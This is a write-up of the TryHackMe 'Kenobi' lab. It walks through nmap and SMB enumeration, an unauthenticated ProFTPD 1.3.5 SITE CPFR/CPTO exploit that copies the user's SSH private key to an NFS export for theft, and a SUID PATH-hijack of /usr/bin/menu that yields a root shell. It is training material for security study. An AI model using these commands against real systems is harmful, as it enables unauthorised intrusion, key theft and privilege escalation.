# [Kenobi](https://tryhackme.com/room/kenobi)

## Task 1: Deploy the vulnerable machine

First enumeration with nmap
```console
┌──(kali㉿kali)-[~]
└─$ ip=10.10.206.1

┌──(kali㉿kali)-[~]
└─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p$ports $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 03:43 EDT
Nmap scan report for 10.10.206.1
Host is up (0.16s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      39616/udp6  mountd
|   100005  1,2,3      40679/tcp6  mountd
|   100005  1,2,3      59695/tcp   mountd
|   100005  1,2,3      60398/udp   mountd
|   100021  1,3,4      38035/tcp6  nlockmgr
|   100021  1,3,4      46230/udp   nlockmgr
|   100021  1,3,4      46371/tcp   nlockmgr
|   100021  1,3,4      48868/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
39445/tcp open  mountd      1-3 (RPC #100005)
46371/tcp open  nlockmgr    1-4 (RPC #100021)
48863/tcp open  mountd      1-3 (RPC #100005)
59695/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m07s, deviation: 2h53m13s, median: 6s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-06-27T02:44:05-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-06-27T07:44:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.10 seconds
```
- Scan the machine with nmap, how many ports are open?

  7

## Task 2: Enumerating Samba for shares

Run nmap with smb-enum-shares script to get the no. of shares.
```console
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $ip
```
- Using the nmap command above, how many shares have been found?

  3

Connect to the machine with smbclient
```console
┌──(kali㉿kali)-[~]
└─$ smbclient //$ip/anonymous
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877100 blocks available

```
- Once you're connected, list the files on the share. What is the file can you see?

  log.txt

Get the file with smbget `smbget -R smb://$ip/anonymous`
- What port is FTP running on?

  21
- What mount can we see?

  /var

## Task 3: Gain initial access with ProFtpd

From nmap scan we discovered that proFTD 1.3.5 is used here. Search for any known exploits in exploit-db. Got 3 exploits out of which 1 is [RCE](https://www.exploit-db.com/exploits/36803).(A [new RCE](https://www.exploit-db.com/exploits/49908) is also released recently). If you look at the exploits it is using `SITE CPFR` and `SITE CPTO` commands. This commands can copy files/directories from one place to another on the server without authentication. Using this we will get the ssh private keys for kenobi.
```console
┌──(kali㉿kali)-[~/THM/kenobi/exploits]
└─$ nc $ip 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.206.1]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
/var is mounted ar port 111 of kenobi machine. So we are copying the key to that directory. Now we mount the kenobi machine to ours to get the keys.
```
mkdir /mnt/kenobiNFS
mount $ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```
Now login with the key `ssh -i id_rsa kenobi@$ip`. And get the user flag.
- What is Kenobi's user flag (/home/kenobi/user.txt)?

  d0b\******899

## Task 4: Privilege Escalation with Path Variable Manipulation
Find the SUID enabled files
```console
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```
The `/usr/bin/menu` is not a common item in this list(To find the common one s run this in your own machine). Lets run this.
```console
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Sun, 27 Jun 2021 08:36:57 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:e3:2c:7c:d9:69
          inet addr:10.10.206.1  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::e3:2cff:fe7c:d969/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:71928 errors:0 dropped:0 overruns:0 frame:0
          TX packets:71670 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:4345649 (4.3 MB)  TX bytes:3961746 (3.9 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:198 errors:0 dropped:0 overruns:0 frame:0
          TX packets:198 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:14581 (14.5 KB)  TX bytes:14581 (14.5 KB)

kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :4

 Invalid choicekenobi@kenobi:~$
```
It looks like this runs common if-else statements and based on input it executes some tasks.
Let see if we can understand the executable with strings command.
```console
kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice

```
From this we can guess the file has a logic as follow
```
if input=1
  run curl -I localhost
elif input=2
  run uname -r
elif input=3
  run ifconfig
else
  print Invalid choice
```
The commands the programes are running are not full paths. So we can manipulate the path to gain a root shell.
```console
kenobi@kenobi:~$ cd /tmp/
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
# cd /root
# ls
root.txt
#
```
So here we are creating a curl command in `/tmp` dir which is same as '/bin/sh'.Then adding `/tmp` to PATH. So when we run `curl` via `menu`
instead of running original curl command it is running `/tmp/curl` which actually executes `/bin/sh` and we get a root shell.

- What file looks particularly out of the ordinary?

  /usr/bin/menu
- Run the binary, how many options appear?

  3
- What is the root flag (/root/root.txt)?

  177\******f02
